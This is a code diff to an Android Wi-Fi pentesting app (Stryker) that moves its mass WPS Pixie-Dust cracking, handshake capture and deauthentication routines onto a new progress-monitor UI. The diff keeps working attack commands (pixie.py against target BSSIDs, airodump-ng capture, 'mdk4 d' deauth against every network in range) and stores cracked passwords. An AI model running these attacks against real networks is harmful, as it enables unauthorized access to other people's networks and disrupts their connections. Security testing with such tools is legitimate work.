@@ -36,6 +36,10 @@ import com.zalexdev.stryker.R;
 import com.zalexdev.stryker.custom.WiFINetwork;
 import com.zalexdev.stryker.utils.AdvancedProcess;
 import com.zalexdev.stryker.utils.Core;
+import com.zalexdev.stryker.wifi.attack.AttackKind;
+import com.zalexdev.stryker.wifi.attack.AttackMetric;
+import com.zalexdev.stryker.wifi.attack.AttackMonitor;
+import com.zalexdev.stryker.wifi.attack.AttackStage;
 
 import java.io.BufferedReader;
 import java.io.FileReader;
@@ -207,13 +211,14 @@ public class Wifi extends Fragment {
             try {
                 if (core.isRootless()) {
                     com.zalexdev.stryker.logger.Logger log = new com.zalexdev.stryker.logger.Logger();
-                    log.writeLine("Rootless WiFi: passing USB adapter into the VM…", 1, "wifi");
-                    boolean attached = core.rootless().ensureUsbWifiAttached();
+                    com.zalexdev.stryker.engine.GuestEngine guest = core.guest();
+                    log.writeLine("Rootless WiFi: passing USB adapter into "
+                            + guest.displayName() + "…", 1, "wifi");
+                    boolean attached = guest.ensureUsbWifiAttached();
                     log.writeLine(attached ? "USB adapter attached — driver OK"
                             : "USB adapter not usable", attached ? 2 : 3, "wifi");
                     if (!attached) {
-                        boolean noDriver = core.rootless().usb() != null
-                                && core.rootless().usb().hasAttached();
+                        boolean noDriver = guest.usb() != null && guest.usb().hasAttached();
                         safeUi(noDriver ? this::showNoDriverState : this::showNoAdapterState);
                         return;
                     }
@@ -512,51 +517,27 @@ public class Wifi extends Fragment {
 
     public void runPixies(ArrayList<WiFINetwork> list) {
         if (list == null) return;
-        final Dialog dialog = new Dialog(context);
-        dialog.setContentView(R.layout.wifi_dialog_attack);
-        Window window = dialog.getWindow();
-        if (window != null) {
-            window.setBackgroundDrawable(new ColorDrawable(Color.TRANSPARENT));
-            window.setLayout(LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT);
-        }
-        dialog.setCancelable(false);
-        TextView name = dialog.findViewById(R.id.wifi_name);
-        TextView mac = dialog.findViewById(R.id.wifi_mac);
-        TextView model = dialog.findViewById(R.id.wifi_model);
-        TextView cancel = dialog.findViewById(R.id.wifi_cancel);
-        TextView outputtext = dialog.findViewById(R.id.wifi_output);
-        TextView resulttext = dialog.findViewById(R.id.wifi_result);
-        TextView timertext = dialog.findViewById(R.id.timer_wifi);
-        TextView successtext = dialog.findViewById(R.id.success_wifi);
-        TextView progress = dialog.findViewById(R.id.progress_wifi);
-        MaterialCardView info = dialog.findViewById(R.id.info_card);
-        info.setVisibility(View.VISIBLE);
-        AtomicBoolean cancelattack = new AtomicBoolean(false);
-        TextView autoconnect = dialog.findViewById(R.id.wifi_autoconnect);
-        autoconnect.setVisibility(View.VISIBLE);
-        autoconnect.setText("Skip this network");
-
-        ImageView wifiimg = dialog.findViewById(R.id.wifi_img);
-        ProgressBar attack_progress = dialog.findViewById(R.id.attacking_progress);
-        outputtext.setMovementMethod(new ScrollingMovementMethod());
-        View outputcard = dialog.findViewById(R.id.output_card);
+        final AttackMonitor monitor = AttackMonitor.open(activity, core, AttackKind.MASS_PIXIE,
+                "Preparing", list.size() + " networks queued");
+        final AtomicBoolean cancelattack = new AtomicBoolean(false);
         final AdvancedProcess[] pixie = {null};
         final Timer[] timer = {new Timer()};
+        final int[] totalSuccess = {0};
+        final int[] total = {0};
 
-        progress.setText("Progress: 0" + "/" + list.size());
-        autoconnect.setOnClickListener(v -> {
+        monitor.metric(AttackMetric.PROGRESS, "0 / " + list.size());
+        monitor.metric(AttackMetric.CRACKED, 0);
+        monitor.stage(AttackStage.RADIO, AttackStage.State.ACTIVE, "Taking the radio off Android");
+
+        monitor.secondary("Skip this network", () -> {
             if (pixie[0] != null) {
                 pixie[0].kill();
+                monitor.note("Skipped by request");
             }
         });
-        if (core.getBoolean("hide")) {
-            mac.setText(Core.HIDDEN_MAC);
-        }
-        final int[] totalSuccess = {0};
-        Thread[] pixies = new Thread[1];
-        cancel.setOnClickListener(view2 -> {
+
+        monitor.onStop(() -> {
             cancelattack.set(true);
-            dialog.dismiss();
             if (pixie[0] != null) {
                 pixie[0].kill();
             }
@@ -565,7 +546,9 @@ public class Wifi extends Fragment {
             } catch (Exception e) {
                 e.printStackTrace();
             }
-
+            monitor.hideSecondary();
+            monitor.finish(totalSuccess[0] > 0,
+                    "Cracked " + totalSuccess[0] + " of " + total[0] + " attacked");
             new Thread(() -> {
                 restoreWpsInterface();
                 if (!core.isRootless() && core.isPixieIfaceDown()
@@ -576,10 +559,10 @@ public class Wifi extends Fragment {
         });
 
         ArrayList<String> tried = new ArrayList<>();
-        pixies[0] = new Thread(() -> {
+        Thread sweep = new Thread(() -> {
             core.wpsDisableWifiIfEnabled();
-
-            final int[] total = {0};
+            monitor.stage(AttackStage.RADIO, AttackStage.State.DONE);
+            monitor.stage(AttackStage.SWEEP, AttackStage.State.ACTIVE);
 
             for (WiFINetwork temp : list) {
                 if (cancelattack.get()) {
@@ -597,7 +580,7 @@ public class Wifi extends Fragment {
                     @Override
                     public void run() {
                         time[0]--;
-                        safeUi(() -> timertext.setText("Timeout: " + time[0]));
+                        monitor.metric(AttackMetric.TIMEOUT, time[0] + "s");
                         if (time[0] <= 0) {
                             if (pixie[0] != null) {
                                 pixie[0].kill();
@@ -607,26 +590,14 @@ public class Wifi extends Fragment {
                             } catch (Exception e) {
                                 e.printStackTrace();
                             }
-                            safeUi(() -> outputtext.append("Timeout! Skipping...\n"));
+                            monitor.note("Timeout — skipping this target");
                         }
                     }
                 }, 0, 1000);
                 if (temp.getWps() && !temp.isBlocked && !tried.contains(temp.getSsid())) {
-                    safeUi(() -> {
-                        if (core.getBoolean("hide")) {
-                            name.setText(Core.HIDDEN_MAC);
-                        } else {
-                            mac.setText(temp.getMac());
-                        }
-                        name.setText(temp.getSsid());
-                        if (temp.getModel() != null && temp.getModel().length() > 0) {
-                            String modelka = temp.getModel();
-                            model.setText(modelka);
-                        } else {
-                            model.setVisibility(View.GONE);
-                        }
-                    });
-
+                    monitor.target(temp.getSsid(), targetMeta(temp));
+                    monitor.metric(AttackMetric.TARGET, temp.getSsid());
+                    monitor.stage(AttackStage.ASSOC, AttackStage.State.ACTIVE);
 
                     String cmd = " python3 -u /CORE/PixieWps/pixie.py -i " + core.getWPSInterface()
                             + core.wpsIfaceDownFlag() + " -K -F -b " + temp.getMac();
@@ -636,41 +607,27 @@ public class Wifi extends Fragment {
                             WiFINetwork result = pixieParse(outputList);
                             if (result.getOK()) {
                                 totalSuccess[0]++;
+                                monitor.note(temp.getSsid() + " — " + result.getPsk());
                                 if (core.isStoreEnabled()) {
                                     core.saveNetwork(temp.getMac(), result.getPsk(), result.getPin(), temp.ssid);
                                 }
                             }
                             total[0]++;
                             tried.add(temp.getSsid());
-                            if (isAdded() && alive.get()) {
-                                successtext.setText("Success: " + totalSuccess[0]);
-                                progress.setText("Progress: " + total[0] + "/" + list.size());
-                            }
+                            monitor.metric(AttackMetric.CRACKED, totalSuccess[0]);
+                            monitor.metric(AttackMetric.PROGRESS, total[0] + " / " + list.size());
                         }
 
                         @Override
                         public void onNewLine(String line) {
-
                             if (line.contains("Associating with AP…")) {
                                 scanCount[0]++;
-
                             }
                             if (scanCount[0] > 4) {
                                 pixie[0].kill();
-                                if (isAdded() && alive.get()) {
-                                    outputtext.append("Router in Push Button Mode. Skipping...\n");
-                                }
+                                monitor.note("Router in push-button mode — skipping");
                             }
-                            if (core.getBoolean("hide")) {
-                                Matcher m = Pattern.compile("((\\w{2}:){5}\\w{2})").matcher(line);
-                                if (m.find()) {
-                                    line = line.replace(m.group(), Core.HIDDEN_MAC);
-                                }
-                            }
-                            if (isAdded() && alive.get()) {
-                                outputtext.append(line + "\n");
-                                smoothScrool(outputtext);
-                            }
+                            monitor.wps(maskedLine(line));
                         }
 
                         @Override
@@ -688,7 +645,6 @@ public class Wifi extends Fragment {
                         }
                     }
                     restoreWpsInterface();
-                    safeUi(() -> outputtext.setText("Switching to other target...\n"));
                 }
             }
             restoreWpsInterface();
@@ -697,50 +653,25 @@ public class Wifi extends Fragment {
             } catch (Exception e) {
                 e.printStackTrace();
             }
-            safeUi(() -> {
-                core.scale(wifiimg, 1.0F);
-                core.scale(attack_progress, 0.0F);
-                resulttext.setVisibility(View.VISIBLE);
-                outputcard.setVisibility(View.GONE);
-                resulttext.setText("Successful attacks: " + totalSuccess[0] + "/" + total[0]);
-                cancel.setText("Close");
-                autoconnect.setVisibility(View.GONE);
-                mac.setText("");
-                name.setText("Attack finished");
-                model.setText("");
-            });
+            monitor.hideSecondary();
+            monitor.stage(AttackStage.SWEEP, AttackStage.State.DONE,
+                    total[0] + " of " + list.size() + " attacked");
+            monitor.target("Sweep finished", list.size() + " networks queued");
+            monitor.finish(totalSuccess[0] > 0,
+                    "Cracked " + totalSuccess[0] + " of " + total[0] + " attacked");
         });
-        attackThread = pixies[0];
-        pixies[0].start();
-        dialog.show();
+        attackThread = sweep;
+        sweep.start();
     }
 
     public void runHS() {
-        final Dialog dialog = new Dialog(context);
-        dialog.setContentView(R.layout.wifi_dialog_hs);
-        Window window = dialog.getWindow();
-        if (window != null) {
-            window.setBackgroundDrawable(new ColorDrawable(Color.TRANSPARENT));
-            window.setLayout(LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT);
-        }
-        dialog.setCancelable(false);
-
-        TextView outputtext = dialog.findViewById(R.id.wifi_output);
-        TextView resulttext = dialog.findViewById(R.id.wifi_result);
-        MaterialButton stop = dialog.findViewById(R.id.stop);
-        TextView timertext = dialog.findViewById(R.id.timer_wifi);
-        TextView successtext = dialog.findViewById(R.id.success_wifi);
-        TextView progress = dialog.findViewById(R.id.progress_wifi);
-        MaterialCardView info = dialog.findViewById(R.id.info_card);
-        info.setVisibility(View.VISIBLE);
+        final AttackMonitor monitor = AttackMonitor.open(activity, core, AttackKind.MASS_HANDSHAKE,
+                "Everything in range", core.getHSInterface());
         networksHS = new ArrayList<>();
         wifimacs = new ArrayList<>();
         hs = new ArrayList<>();
         devices = new ArrayList<>();
 
-        AtomicBoolean cancelattack = new AtomicBoolean(false);
-        View outputcard = dialog.findViewById(R.id.output_card);
-        outputtext.setMovementMethod(new ScrollingMovementMethod());
         AtomicReference<Timer> csvReader = new AtomicReference<>(new Timer());
 
         final String hsDir = core.getShareRoot() + "/hs";
@@ -749,25 +680,29 @@ public class Wifi extends Fragment {
         final boolean[] device = {false};
         final int[] totalSuccess = {0};
         mdk4 = null;
-        outputtext.setText("Starting monitor mode...\n");
+        monitor.stage(AttackStage.MONITOR, AttackStage.State.ACTIVE);
         new Thread(() -> {
             final String requestedIface = core.getHSInterface();
-            safeUi(() -> outputtext.setText("Starting monitor mode on " + requestedIface + "...\n"));
-            boolean monitor = core.monitorManager.enableMonitorMode(requestedIface);
+            monitor.stage(AttackStage.MONITOR, AttackStage.State.ACTIVE, requestedIface);
+            boolean monitorMode = core.monitorManager.enableMonitorMode(requestedIface);
             String capIface = requestedIface;
-            if (!monitor) {
-                safeUi(() -> outputtext.setText(getString(R.string.wifi_monitor_failed, requestedIface)));
+            if (!monitorMode) {
+                monitor.failStage(AttackStage.MONITOR, "Interface refused monitor mode",
+                        getString(R.string.wifi_monitor_failed, requestedIface));
             } else {
                 capIface = core.getHSInterface();
-                core.customChrootCommand("mkdir -p /sdcard/Stryker/hs /sdcard/Stryker/captured; "
-                        + "rm -f /sdcard/Stryker/hs/handshakenow*");
-                String cmd = "airodump-ng " + capIface + " -w /sdcard/Stryker/hs/handshakenow --ignore-negative-one --output-format pcap,csv  --update 3";
+                monitor.stage(AttackStage.MONITOR, AttackStage.State.DONE, capIface);
+                monitor.stage(AttackStage.CAPTURE, AttackStage.State.ACTIVE, "airodump-ng, all channels");
+                String guestShare = core.guestShare();
+                core.customChrootCommand("mkdir -p " + guestShare + "/hs " + guestShare + "/captured; "
+                        + "rm -f " + guestShare + "/hs/handshakenow*");
+                String cmd = "airodump-ng " + capIface + " -w " + guestShare
+                        + "/hs/handshakenow --ignore-negative-one --output-format pcap,csv  --update 3";
                 airodump = new AdvancedProcess(activity, context, cmd, true) {
                     @Override
                     public void onFinished(ArrayList<String> outputList) {
-                        if (isAdded() && alive.get()) {
-                            outputtext.setText("Attack finished due to error.\n");
-                        }
+                        monitor.failStage(AttackStage.CAPTURE, "airodump-ng exited",
+                                "Attack finished due to error");
                         try {
                             csvReader.get().cancel();
                         } catch (Exception e) {
@@ -784,13 +719,13 @@ public class Wifi extends Fragment {
                                 if (!hs.contains(m.group())) {
                                     hs.add(m.group());
                                     totalSuccess[0]++;
-                                    if (isAdded() && alive.get()) {
-                                        timertext.setText("Success: " + totalSuccess[0]);
-                                    }
+                                    monitor.metric(AttackMetric.CAPTURED, totalSuccess[0]);
+                                    monitor.stage(AttackStage.EAPOL, AttackStage.State.DONE,
+                                            totalSuccess[0] + " captured so far");
                                 }
                             }
                         }
-
+                        monitor.airodump(line, null);
                     }
 
                     @Override
@@ -802,7 +737,7 @@ public class Wifi extends Fragment {
             }
 
             boolean s = false;
-            if (monitor) {
+            if (monitorMode) {
                 for (int i = 0; i < 40 && alive.get(); i++) {
                     if (core.checkFile(hsDir + "/handshakenow-01.csv")) {
                         s = true;
@@ -817,7 +752,8 @@ public class Wifi extends Fragment {
                 }
             }
             if (s) {
-                final String[] packet = {""};
+                monitor.stage(AttackStage.CAPTURE, AttackStage.State.DONE, "Writing to " + hsDir);
+                monitor.stage(AttackStage.EAPOL, AttackStage.State.ACTIVE, "Waiting for clients to rejoin");
                 csvReader.set(new Timer());
                 csvReader.get().schedule(new TimerTask() {
                     @Override
@@ -835,45 +771,8 @@ public class Wifi extends Fragment {
                         for (List<String> line : records) {
                             if (line.size() > 1) {
                                 if (line.get(0).equals("BSSID")) {
-                                    final int deviceCount = devices.size();
-                                    final int networkCount = networksHS.size();
-                                    final ArrayList<String> devSnap = new ArrayList<>(devices);
-                                    final ArrayList<String> hsSnap = new ArrayList<>(hs);
-                                    final ArrayList<String> ssidSnap = new ArrayList<>();
-                                    for (WiFINetwork n : networksHS) {
-                                        ssidSnap.add(n.getSsid());
-                                    }
-                                    final String packetNow = packet[0];
-                                    safeUi(() -> {
-                                        try {
-                                            successtext.setText("Devices: " + deviceCount);
-                                            progress.setText("Networks: " + networkCount);
-                                            StringBuilder sb = new StringBuilder();
-                                            if (!hsSnap.isEmpty()) {
-                                                sb.append("\n\nHS: ");
-                                                for (String s : hsSnap) {
-                                                    if (core.getBoolean("hide")) {
-                                                        sb.append(Core.HIDDEN_MAC).append(" ");
-                                                    } else {
-                                                        sb.append(s).append(" ");
-                                                    }
-                                                }
-                                            }
-                                            sb.append("\n\nNetworks: ");
-                                            for (String s : ssidSnap) {
-                                                sb.append(s).append(" ");
-                                            }
-                                            sb.append("\n\nPacket: ").append(packetNow);
-                                            sb.append("\n\nDevices: ");
-                                            for (String d : devSnap) {
-                                                sb.append(d).append(" ");
-                                            }
-                                            outputtext.setText(sb.toString());
-                                        } catch (Exception e) {
-                                            e.printStackTrace();
-                                        }
-                                    });
-
+                                    monitor.metric(AttackMetric.NETWORKS, networksHS.size());
+                                    monitor.metric(AttackMetric.CLIENTS, devices.size());
                                     devices.clear();
                                     networksHS.clear();
                                     wifimacs.clear();
@@ -910,18 +809,18 @@ public class Wifi extends Fragment {
                     core.monitorManager.enableMonitorMode(deauthIface);
                     deauthIface = core.getDeauthInterface();
                 }
+                monitor.stage(AttackStage.DEAUTH, AttackStage.State.ACTIVE, "mdk4 on " + deauthIface);
                 mdk4 = new AdvancedProcess(activity, context, "mdk4 " + deauthIface + " d", true) {
                     @Override
                     public void onFinished(ArrayList<String> outputList) {
                         core.toaster("Mdk4 stopped");
-                        packet[0] = "Deauth stopped due critical error";
+                        monitor.stage(AttackStage.DEAUTH, AttackStage.State.FAILED,
+                                "mdk4 stopped — capture continues passively");
                     }
 
                     @Override
                     public void onNewLine(String line) {
-                        if (line.contains("Packets sent")) {
-                            packet[0] = line;
-                        }
+                        monitor.mdk4(maskedLine(line));
                     }
 
                     @Override
@@ -930,11 +829,13 @@ public class Wifi extends Fragment {
                     }
                 };
 
-            } else if (monitor) {
-                safeUi(() -> outputtext.setText("Failed to start attack. Please try again."));
+            } else if (monitorMode) {
+                monitor.failStage(AttackStage.CAPTURE, "airodump-ng never wrote its CSV",
+                        "Failed to start attack. Please try again.");
             }
         }).start();
-        stop.setOnClickListener(v -> {
+
+        monitor.onStop(() -> {
             if (mdk4 != null) {
                 mdk4.kill();
             }
@@ -946,15 +847,11 @@ public class Wifi extends Fragment {
             } catch (Exception e) {
                 e.printStackTrace();
             }
-            stop.setVisibility(View.GONE);
-            dialog.setCancelable(true);
-            outputcard.setVisibility(View.GONE);
-            resulttext.setVisibility(View.VISIBLE);
             final int captured = hs.size();
-            if (captured > 0) {
-                resulttext.setText("Success: " + totalSuccess[0] + "\nSaving capture…");
+            if (captured == 0) {
+                monitor.finish(false, "No handshake captured");
             } else {
-                resulttext.setText("Failed to capture handshake");
+                monitor.stage(AttackStage.SAVE, AttackStage.State.ACTIVE);
             }
             new Thread(() -> {
                 if (captured > 0) {
@@ -967,81 +864,46 @@ public class Wifi extends Fragment {
                         core.moveFile(src.getAbsolutePath(), dest);
                         saved = new java.io.File(dest).isFile();
                     }
-                    final boolean ok = saved;
-                    safeUi(() -> resulttext.setText(ok
-                            ? "Success: " + totalSuccess[0] + "\nFile saved to: " + dest
-                            : "Success: " + totalSuccess[0]
-                              + "\nBut the capture file could not be saved — check the log"));
+                    if (saved) {
+                        monitor.stage(AttackStage.SAVE, AttackStage.State.DONE, dest);
+                        monitor.finish(true, totalSuccess[0] + " handshakes\n" + dest);
+                    } else {
+                        monitor.stage(AttackStage.SAVE, AttackStage.State.FAILED,
+                                "Nothing to move out of the share");
+                        monitor.finish(false, totalSuccess[0]
+                                + " handshakes, but the capture file could not be saved — check the log");
+                    }
                 }
                 core.monitorManager.disableMonitorMode(core.getHSInterface());
                 core.monitorManager.disableMonitorMode(core.getDeauthInterface());
             }).start();
-
         });
-
-        dialog.show();
     }
 
     public void runDeauth() {
-        final Dialog dialog = new Dialog(context);
-        dialog.setContentView(R.layout.wifi_dialog_hs);
-        Window window = dialog.getWindow();
-        if (window != null) {
-            window.setBackgroundDrawable(new ColorDrawable(Color.TRANSPARENT));
-            window.setLayout(LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT);
-        }
-        dialog.setCancelable(false);
-
-        View outputcard = dialog.findViewById(R.id.output_card);
-        TextView outputtext = dialog.findViewById(R.id.wifi_output);
-        TextView resulttext = dialog.findViewById(R.id.wifi_result);
-        MaterialButton stop = dialog.findViewById(R.id.stop);
-        TextView title = dialog.findViewById(R.id.scan_text);
-        title.setText("Deauthenticating");
-        MaterialCardView info_card = dialog.findViewById(R.id.info_card);
-        info_card.setVisibility(View.GONE);
-        outputtext.setMovementMethod(new ScrollingMovementMethod());
-        outputtext.append("Starting monitor mode...\n");
+        final AttackMonitor monitor = AttackMonitor.open(activity, core, AttackKind.MASS_DEAUTH,
+                "Every network in range", core.getDeauthInterface());
+        monitor.stage(AttackStage.MONITOR, AttackStage.State.ACTIVE);
         new Thread(() -> {
             final String requestedIface = core.getDeauthInterface();
-            safeUi(() -> outputtext.append("Interface: " + requestedIface + "\n"));
+            monitor.metric(AttackMetric.IFACE, requestedIface);
+            monitor.stage(AttackStage.MONITOR, AttackStage.State.ACTIVE, requestedIface);
             if (core.monitorManager.enableMonitorMode(requestedIface)) {
-                mdk4 = new AdvancedProcess(activity, context, "mdk4 " + core.getDeauthInterface() + " d", true) {
-
-                    @Override
-                    protected void onPrepare() {
-                        if (isAdded() && alive.get()) {
-                            outputtext.append("Success");
-                        }
-                        super.onPrepare();
-                    }
+                final String monIface = core.getDeauthInterface();
+                monitor.metric(AttackMetric.IFACE, monIface);
+                monitor.stage(AttackStage.MONITOR, AttackStage.State.DONE, monIface);
+                monitor.stage(AttackStage.INJECT, AttackStage.State.ACTIVE, "mdk4 deauth mode");
+                mdk4 = new AdvancedProcess(activity, context, "mdk4 " + monIface + " d", true) {
 
                     @Override
                     public void onFinished(ArrayList<String> outputList) {
                         core.toaster("Mdk4 stopped");
-                        if (isAdded() && alive.get()) {
-                            outputcard.setVisibility(View.GONE);
-                            resulttext.setVisibility(View.VISIBLE);
-                            resulttext.setText("Attack stopped");
-                        }
+                        monitor.finish(false, "Attack stopped");
                     }
 
                     @Override
                     public void onNewLine(String line) {
-                        if (!isAdded() || !alive.get()) {
-                            return;
-                        }
-                        if (line.contains("Packets sent")) {
-                            outputtext.setText("");
-                        }
-                        if (core.getBoolean("hide")) {
-                            Matcher m = Pattern.compile("((\\w{2}:){5}\\w{2})").matcher(line);
-                            if (m.find()) {
-                                line = line.replace(m.group(), Core.HIDDEN_MAC);
-                            }
-                        }
-                        outputtext.append(line + "\n");
-                        smoothScrool(outputtext);
+                        monitor.mdk4(maskedLine(line));
                     }
 
                     @Override
@@ -1050,17 +912,13 @@ public class Wifi extends Fragment {
                     }
                 };
             } else {
-                safeUi(() -> {
-                    core.toaster("Mdk4 stopped");
-                    outputcard.setVisibility(View.GONE);
-                    resulttext.setVisibility(View.VISIBLE);
-                    resulttext.setText("Attack stopped, failed to start monitor mode");
-                });
-
+                core.toaster("Mdk4 stopped");
+                monitor.failStage(AttackStage.MONITOR, "Interface refused monitor mode",
+                        "Attack stopped, failed to start monitor mode");
             }
         }).start();
 
-        stop.setOnClickListener(v -> {
+        monitor.onStop(() -> {
             if (mdk4 != null) {
                 mdk4.kill();
             }
@@ -1069,13 +927,27 @@ public class Wifi extends Fragment {
 
             }
             new Thread(() -> core.monitorManager.disableMonitorMode(core.getDeauthInterface())).start();
-            stop.setVisibility(View.GONE);
-            dialog.setCancelable(true);
-            outputcard.setVisibility(View.GONE);
-            resulttext.setVisibility(View.VISIBLE);
-            resulttext.setText("Attack stopped");
+            monitor.finish(false, "Attack stopped");
         });
-        dialog.show();
+    }
+
+    private String targetMeta(WiFINetwork network) {
+        StringBuilder sb = new StringBuilder();
+        sb.append(core.getBoolean("hide")
+                ? Core.HIDDEN_MAC
+                : String.valueOf(network.getMac()).toUpperCase(Locale.ROOT));
+        if (network.getChannel() > 0) sb.append("  ch ").append(network.getChannel());
+        sb.append(network.getIs5hhz() ? "  5 GHz" : "  2.4 GHz");
+        sb.append("  ").append(Math.max(0, Math.min(100, 100 - network.getPower()))).append("%");
+        String model = network.getModel();
+        if (model != null && !model.isEmpty()) sb.append('\n').append(model);
+        return sb.toString();
+    }
+
+    private String maskedLine(String line) {
+        if (line == null || !core.getBoolean("hide")) return line;
+        Matcher m = Pattern.compile("((\\w{2}:){5}\\w{2})").matcher(line);
+        return m.find() ? line.replace(m.group(), Core.HIDDEN_MAC) : line;
     }
 
     private static java.io.File newestCapture(String dir, String prefix) {
@@ -1088,17 +960,6 @@ public class Wifi extends Fragment {
             }
         }
         return newest;
-    }
-
-    public void smoothScrool(TextView outputtext) {
-        if (outputtext != null && outputtext.getLayout() != null) {
-            int lineCount = outputtext.getLineCount();
-            if (lineCount > 100) {
-                outputtext.setText("");
-            }
-            final int scrollAmount = outputtext.getLayout().getLineTop(outputtext.getLineCount()) - outputtext.getHeight();
-            outputtext.scrollTo(0, Math.max(scrollAmount, 0));
-        }
     }
 
     private void restoreWpsInterface() {
